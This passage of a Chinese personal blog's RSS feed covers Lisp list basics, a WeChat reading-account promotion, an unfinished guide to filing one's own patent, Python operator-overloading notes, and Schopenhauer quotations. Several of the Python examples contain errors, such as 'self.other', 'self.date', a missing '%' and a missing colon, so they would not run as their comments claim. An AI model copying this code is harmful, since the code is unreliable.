&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="nv"&gt;LIONS&lt;/span&gt; &lt;span class="nv"&gt;TIGERS&lt;/span&gt; &lt;span class="nv"&gt;BEARS&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;ul&gt;
&lt;li&gt;要获取列表的第二或第三个元素，应该获取 rest 中的 first，或 rest 中的 rest 中的 first&lt;/li&gt;
&lt;/ul&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&amp;gt;(first (rest &amp;#39;(1 2 3)))
2

&amp;gt;(first (rest (rest &amp;#39;(1 2 3))))
3
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;在如此简单的原语之上构建一门简洁优美的语言，其中的原理让一些程序员激动不已。这些由列表构建的简单指令构成了递归、高阶函数，甚至是闭包和 continuation 之类高级抽象的基础&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;下面回顾一下到目前为止看到的内容： 
Lisp 使用列表和原子来表示数据和程序。&lt;br /&gt;
对列表求值时将第一个元素看作列表函数，将其他元素看作函数参数。&lt;br /&gt;
Lisp 条件语句将 true/false 表达式和代码一起使用。  &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;waiting&lt;/p&gt;
&lt;p&gt;参考资料：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="http://www.ibm.com/developerworks/cn/java/j-cb02067.html"&gt;跨越边界: Lisp 之美&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#"&gt;Clojure编程&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Sun, 23 Feb 2014 00:00:00 +0000</pubDate><guid>tag:,2014-02-23:learnning-lisp-1.html</guid><category>lisp</category></item><item><title>一起赖床阅读吧</title><link>/web-wechat.html</link><description>&lt;p&gt;建了一个微信公众号，专注于优质文章的推送。&lt;br /&gt;
share with you ～&lt;/p&gt;
&lt;h3&gt;一起赖床阅读吧&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;人间乐事，阅读、赖床。 &lt;/li&gt;
&lt;li&gt;每晚精选三篇文章，丰富你睡前、醒后的时光。 &lt;/li&gt;
&lt;li&gt;希望通过阅读成为一个有趣的人，与君共勉^_^&lt;/li&gt;
&lt;li&gt;love life , love reading&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;=====================================================&lt;/p&gt;
&lt;h3&gt;关注方法：&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;在微信中扫一扫加关注: &lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;&lt;img alt="图片" src="content/img/yqlc.jpg" /&gt;&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;或者搜索公众号:"一起赖床阅读吧" &lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;为文章归档&lt;/h3&gt;
&lt;h4&gt;14/2/20&lt;/h4&gt;
&lt;ul&gt;
&lt;li&gt;1&lt;/li&gt;
&lt;li&gt;2&lt;/li&gt;
&lt;/ul&gt;
&lt;h4&gt;14/2/21&lt;/h4&gt;
&lt;h4&gt;14/2/22&lt;/h4&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 20 Feb 2014 00:00:00 +0000</pubDate><guid>tag:,2014-02-20:web-wechat.html</guid><category>wechat</category></item><item><title>申请一份自己的专利</title><link>/application%20for%20patent.html</link><description>&lt;p&gt;真的比你想象的简单。just do it&lt;/p&gt;
&lt;p&gt;大三一年，申请了两份专利。也帮舍友申请了两份。现在申请一份专利对我而言算是驾轻就熟了。与大家分享一些经验。&lt;/p&gt;
&lt;p&gt;开源与专利是个有趣的话题，甚至是冲突极其激烈的地方，在此不想讨论。我在这里更倾向帮助小伙伴们申请一些实用新型专利。&lt;br /&gt;
你当然可以认为这是功利的视角。  事实上也差不多正是这样。  &lt;/p&gt;
&lt;p&gt;本着geek的精神，我们坚持自给自足，不请代理。从撰写专利申请文件到缴费，以及申请过程中可能遇到的补正书，我们自己都能完成，而且很简单。&lt;/p&gt;
&lt;p&gt;为什么要自己撰写，基于以下原因：  &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;p&gt;对于在校生（本人也依然是学生党），许多童鞋申请专利是为了加学分（奖学金），或者找工作时有个漂亮的证书，当然还有一些童鞋本身很有想法（比如我的上铺，满脑子的创意）。学会自己撰写专利，可以随时把想法固化为专利证书，说不定那天能派上用场。转让或者用来创业之类。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;既然是学生党，我们很穷T_T。花个几千，找个代理，真心觉得贵，有这么多闲钱，不如去游山玩水拓宽视野，何况这些钱够陪妹子吃很多次饭，看很多场电影了有木有。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;此外我们也很难预测哪个创意更有价值，比如我觉得我舍友的许多创意都是极有市场前景的，主要很难找到合适的买家，这是曝光度的问题。我们先不讨论。如果都请代理的话，这是一笔很大的开支，而且你不知道哪个想法真正对你有用，就是说有一些专利（或者说大多数）并不能产生价值。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;你其实在做一项投资，为你的创意投资。我们希望一种成本不高的投资方式。答案是自己申请。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;这么做有没有坏处呢，有的，显而易见的不足就是，你不够专业，权利要求书可能写得不好，对专利的保护不够周到。如果你觉得你的创意价值百万，那么不要犹豫，去请一个权威的代理吧，代价是那样可能很贵。回到现实吧，如果你仅仅是为了混个证书（这样不好，投机取巧），混个奖学金或者为面试加分的话，你并不太考虑权利保护的问题，你并不是打算把专利卖出去，那么没必要花大代价去请权威代理。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;如果你真的有特别多创意（再次表扬一下我的上铺），那你可能常常需要申请专利，那么随着你对这个领域的熟悉，你的权利要求书会写得越来越好。这样你其实是把这件事当成了长期投资，你同时获得了一项技能，甚至可以帮助别人撰写专利。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;至于你想获得奖学金什么的，这确实是个捷径，你当然可以使用，只是如果你真的对创新本身感兴趣，你会很享受自己把想法落实到纸上的过程，不然你可能感到无聊，兴趣是最好的老师。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;作为一项投资的话，很划算，我和舍友算了一下，一个专利，费用减缓请求之后（后面我会说明），费用总共两三百元。等你工作后，一年申请个十来份也很便宜。而这个投资比买彩票更让人兴奋。它锻炼你的头脑还可能充实你的钱包。&lt;/p&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;p&gt;最后，申请个专利真的是很容易的一件事，当然可能有点繁琐&lt;/p&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;我在这里，重点讲解使用电子申请，这个比纸质申请方便快捷，无论电子申请，还是纸质申请，申请材料的的撰写是一样的，这部分知识，我们可以通过网络和图书馆获取。作为学生，我不知道还有什么东西比图书馆更美好。&lt;/p&gt;
&lt;p&gt;电子申请是未来的趋势，纸质申请近期可能被淘汰。&lt;/p&gt;
&lt;p&gt;使用电子申请的最大好处是快速，便捷，你可以足不出户提交申请文件，网上缴费。
你如过尝试过纸质申请（比如我T_T），真的会对如今的互联网感激涕零。&lt;/p&gt;
&lt;p&gt;先给大家献上一些常用的网络资源：
waiting ...
午饭时间到&lt;/p&gt;
&lt;h1&gt;图书资源&lt;/h1&gt;
&lt;h1&gt;网络资源&lt;/h1&gt;
&lt;p&gt;&lt;a href="http://www.sipo.gov.cn/"&gt;中华人民共和国国家知识产权局&lt;/a&gt;
&lt;a href="http://zhuanli.baidu.com/"&gt;百度专利搜索&lt;/a&gt;
&lt;a href="http://www.duxiu.com/?channel=searchPatent"&gt;读秀专利搜索&lt;/a&gt;
&lt;a href="http://www.soopat.com/"&gt;SooPAT 专利搜索&lt;/a&gt;
[中国专利下载]（http://www.drugfuture.com/cnpat/cn_patent.asp）
&lt;a href="http://www.cponline.gov.cn/"&gt;中国专利电子申请网&lt;/a&gt;&lt;/p&gt;
&lt;h1&gt;实例说明&lt;/h1&gt;
&lt;p&gt;下面我就结合我自己的第一个专利来说明。&lt;/p&gt;
&lt;p&gt;《一种自供电式沙漏灯》，名字听起来很高大上有木有，其实这是很常见的一种命名方式，很保守。但是不容易出现问题。你上网一搜，其实很多这类《一种xxx式xxx》.&lt;/p&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 09 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-09:application for patent.html</guid><category>随笔</category></item><item><title>python笔记之运算符重载</title><link>/learning%20python%204.html</link><description>&lt;p&gt;在此对常用的运算符重载做个小结。包括:&lt;code&gt;__init__&lt;/code&gt; , &lt;code&gt;__str__&lt;/code&gt;(&lt;code&gt;__repr__&lt;/code&gt;) , &lt;code&gt;__call__&lt;/code&gt; , &lt;code&gt;__add__&lt;/code&gt;&lt;/p&gt;
&lt;p&gt;这部分知识属于面向对象部分。&lt;/p&gt;
&lt;h3&gt;关于运算符重载&lt;/h3&gt;
&lt;p&gt;以下是主要概念： &lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;类可以截获python运算符,可覆盖多数内置类型运算:如 加法，切片， 打印， 点号运算&lt;/li&gt;
&lt;li&gt;目的是让对象的用法和外观看起来更像内置类型&lt;/li&gt;
&lt;li&gt;运算符重载让对象与python内置对象模型更紧密结合（接口）,提供了一致性，以及与预期接口的兼容性&lt;/li&gt;
&lt;li&gt;以双下划线命名(&lt;strong&gt;X&lt;/strong&gt;),是特殊钩子,用来拦截运算,定义了固定不变的映射关系&lt;/li&gt;
&lt;li&gt;运算符覆盖方法没有默认值，如果没有定义，又执行相应运算，会触发异常&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;运算符重载的使用者主要是开发工具的人，而不是应用开发这者，不应该盲目使用,清晰优于隐晦&lt;/p&gt;
&lt;p&gt;举个例子：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt;   &lt;span class="nc"&gt;Myclass&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__add__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="n"&gt;Myclass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;date&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__mul__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;display&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;

&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Myclass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;abc&amp;#39;&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     &lt;span class="c1"&gt;#&amp;#39;abc&amp;#39;&lt;/span&gt;

&lt;span class="n"&gt;b&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;+&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;xyz&amp;#39;&lt;/span&gt;
&lt;span class="n"&gt;b&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     &lt;span class="c1"&gt;#&amp;#39;abcxyz&amp;#39;,注意__add__返回了新对象&lt;/span&gt;


&lt;span class="n"&gt;a&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="mi"&gt;3&lt;/span&gt;
&lt;span class="n"&gt;a&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;display&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;     &lt;span class="c1"&gt;#&amp;#39;abcabcabc&amp;#39; ,注意__mul__原地修实例&lt;/span&gt;

&lt;span class="c1"&gt;#补充说明：__add__ , __mul__都是`二元运算`。以__add__(self.other)为例，当进行b = a + &amp;#39;xyz&amp;#39;时，a 赋值给self,&amp;#39;xyz&amp;#39;赋值给other,一般而言实例放在左边，如果实例在右边需要使用__radd__&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h3&gt;更多细节&lt;/h3&gt;
&lt;h4&gt;&lt;strong&gt;init&lt;/strong&gt;&lt;/h4&gt;
&lt;p&gt;每次从类产生实例时， python会在自动调用__init__方法(被称为构造器),这是最常用的运算符重载方法.&lt;br /&gt;
需要注意的地方是__init__常常用于调用超类的构造器，除非明确调用，否则超类构造器会被覆盖&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Super&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="n"&gt;default&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;&lt;span class="o"&gt;...&lt;/span&gt;

&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Sub&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="n"&gt;Super&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;y&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="n"&gt;Super&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="o"&gt;...&lt;/span&gt;&lt;span class="n"&gt;custom&lt;/span&gt; &lt;span class="n"&gt;code&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;h4&gt;__repr__与__str__会返回对象的字符串表现形式&lt;/h4&gt;
&lt;p&gt;当类的实例打印或转换为字符串时，&lt;strong&gt;repr&lt;/strong&gt;(及其近亲__str__)就会自动调用,这些方法可替对象定义更好的显示格式。  &lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Myclass&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="mi"&gt;0&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;

    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__repr__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="s1"&gt;&amp;#39;data is &lt;/span&gt;&lt;span class="si"&gt;%s&lt;/span&gt;&lt;span class="s1"&gt;&amp;#39;&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;data&lt;/span&gt;

&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt;  &lt;span class="n"&gt;Myclass&lt;/span&gt;&lt;span class="p"&gt;()&lt;/span&gt;
&lt;span class="k"&gt;print&lt;/span&gt; &lt;span class="n"&gt;x&lt;/span&gt;     &lt;span class="c1"&gt;#data is 0&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;那么__repr__与__str__的区别是什么，简单地说__repr__更底层，如果没有__str__则调用__repr__（也就是__str__优先），那么可以利用__repr__更底层的特性为所有环境提供统一的字符串显示。为终端用户提供__str__,开发期间则显示__repr__.&lt;/p&gt;
&lt;h4&gt;__call__拦截调用&lt;/h4&gt;
&lt;p&gt;当实例被调用时，使用__call__，这样可以让实例表现得像函数&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="k"&gt;class&lt;/span&gt; &lt;span class="nc"&gt;Myclass&lt;/span&gt;&lt;span class="p"&gt;:&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__init__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;&lt;span class="p"&gt;):&lt;/span&gt;
        &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;value&lt;/span&gt;
    &lt;span class="k"&gt;def&lt;/span&gt; &lt;span class="nf"&gt;__call__&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="p"&gt;,&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
        &lt;span class="k"&gt;return&lt;/span&gt; &lt;span class="bp"&gt;self&lt;/span&gt;&lt;span class="o"&gt;.&lt;/span&gt;&lt;span class="n"&gt;value&lt;/span&gt; &lt;span class="o"&gt;*&lt;/span&gt; &lt;span class="n"&gt;other&lt;/span&gt;

&lt;span class="n"&gt;x&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="n"&gt;Myclass&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;2&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;
&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;3&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#6&lt;/span&gt;
&lt;span class="n"&gt;x&lt;/span&gt;&lt;span class="p"&gt;(&lt;/span&gt;&lt;span class="mi"&gt;4&lt;/span&gt;&lt;span class="p"&gt;)&lt;/span&gt;  &lt;span class="c1"&gt;#8&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;这可能是python中保留状态信息的最好方式，&lt;code&gt;状态的记忆&lt;/code&gt;是明确地使用属性赋值运算实现的。
功能很像函数式编程里的闭包&lt;/p&gt;
&lt;h3&gt;其他&lt;/h3&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;&lt;span class="c1"&gt;#  __del__: 析构方法，与__init__相对&lt;/span&gt;
&lt;span class="c1"&gt;#  __getattr__: 点号运算（获取属性），如：X.name&lt;/span&gt;
&lt;span class="c1"&gt;#  __setattr__: 属性赋值运算， 如： X.name = &amp;#39;wwj&amp;#39;&lt;/span&gt;
&lt;span class="c1"&gt;#  __getitem__: 索引运算 ， X[key],没有__item__时的for循环迭代器。否则__item__优先&lt;/span&gt;
&lt;span class="c1"&gt;#  __setitem__: 索引赋值运算 , 如X[key] = value&lt;/span&gt;
&lt;span class="c1"&gt;#  __iter__: 迭代环境  用于循环，测试，列表，映射&lt;/span&gt;
&lt;span class="c1"&gt;#  __cmp__: 比较 ， 如：X == Y , X &amp;gt; Y&lt;/span&gt;
&lt;span class="c1"&gt;#  __lt__: 小于 。 如： X &amp;lt; Y &lt;/span&gt;
&lt;span class="c1"&gt;#  __eq__: 等于&lt;/span&gt;
&lt;span class="c1"&gt;#  __radd__: 左侧加法，如&amp;#39;abc&amp;#39; + X (对象在右侧)&lt;/span&gt;
&lt;span class="c1"&gt;#  __iadd__: 实地（增强的）加法 ，如：X += Y&lt;/span&gt;
&lt;/pre&gt;&lt;/div&gt;</description><dc:creator xmlns:dc="http://purl.org/dc/elements/1.1/">wuwenjie</dc:creator><pubDate>Thu, 09 Jan 2014 00:00:00 +0000</pubDate><guid>tag:,2014-01-09:learning python 4.html</guid><category>python</category></item><item><title>叔本华美学随笔</title><link>/book-ArthurSchopenhauer.html</link><description>&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;***************************摘自亚瑟.叔本华《美学随笔》 韦启昌 译***************************
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;摘记不免有遗珠之憾，断章取义之嫌，有兴趣的读者还是亲自翻阅书籍吧，不会让你失望的～&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;阅读好书的前提条件之一就是不要读坏书,;因为生命是短暂的,时间和精力都极其有限&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人的可怜本性虽然在每一代人中都改换一下面目,但在各个时代仍然是一样的&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;叔本华的哲学让我得以判断在这之前我还只是直觉上有所感觉的东西。---瓦格纳&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;朴实的风格始终是为天才准备的礼服,正如赤裸是美丽身体的特权一样&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们写出了评论古代伟大思想家的文章、书籍,读者大众就跟随着捧读这些东西,而不是那个思想家的著作&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;论 思 考&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;哪怕是藏书最丰的图书馆,如果书籍放置混乱的话,其实际用处也不及一个收藏不多、但却整理得有条有理的小图书室。同样,大量的知识如果未经自己思想的细心加工处理,其价值也远远逊于数量更少、但却经过头脑多方反复斟酌的知识。   &lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;让自己没有自己思想的最保险的办法就是在空闲的每一分钟马上随手拿起书&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;每一个真正的独立、自为思考的思想家就这一方面而言跟王侯相差无几:他的表达能力单刀直入,从来不会躲躲闪闪、畏首畏尾&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;存在的问题是多么的巨大和迫切——这一问题迎面而来、无法回避!这一存在隐晦不明、充满着疑问,它饱受着痛苦折磨,匆匆即逝、如梦如幻!对这一巨大、迫切的不解之谜一旦有所意识,其他的问题和目标就全都显得不足挂齿了。与此同时,除了稀有的极少数例外情形,我们举目所见的几乎所有人都似乎没有清晰意识到这一问题——事实上,他们好像不曾对此问题有丝毫的察觉。这些人注其他的一切更甚于存在的问题;他们过一天算一天,也不曾稍微长远一点点考虑自己个人的将来,因为他们要么明白无误地拒绝考虑这一问题,要么就是心甘情愿地将就接受某一套大众形而上学,并以得到满足。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h3&gt;论阅读和书籍&lt;/h3&gt;
&lt;ul&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;人们总是阅读最新的,而不是所有时代中最好的作品&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;在挑选阅读物的时候,掌握识别什么不应该读的艺术就成了至为重要的事情。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;认真阅读真正的古老作品,今人对它们的评论并没有太多的意义。 ---施莱格尔&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;读者大众的愚蠢和反常是令人难以置信的,因为他们把各个时代、各个民族保存下来的至为高贵和稀罕的各种思想作品放着不读,一门心思地偏要拿起每天都在涌现的、出自平庸头脑的胡编乱造,纯粹只是因为这些文字是今天才印刷的,油墨还没干透。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;无知只是在与财富结伴时才会丢人现眼。穷人为穷困和匮乏所苦,对于他们来说,劳作代替了求知并占据了他们的全副精神。相比之下,有钱、但无知无识的人却只是生活在感官快乐之中,跟畜生没有什么两样,但这可是司空见惯的情形。&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
&lt;p&gt;我们并不可以通过阅读有文采的作品而掌握这些文采素质，不过,观摩这样的文笔却可以引发我们自身已经具备的这些潜在素质,使自己意识到自己所具备的内在素质;同时也了解到能够把这些素质发挥到怎样的程度。这样,自己也就更加放心地顺应自己的倾向,甚至大胆发挥这些才能。从别人的例子,我们就可以鉴别运用这些才能所产生出来的效果,并由此学习到正确发挥这些才能的技巧。阅读教会了我们如何发挥和运用自身天赋能力的方法和手段——前提当然始终是我们本身已经具备这些天赋&lt;/p&gt;
&lt;/blockquote&gt;
&lt;/li&gt;
&lt;li&gt;
&lt;blockquote&gt;
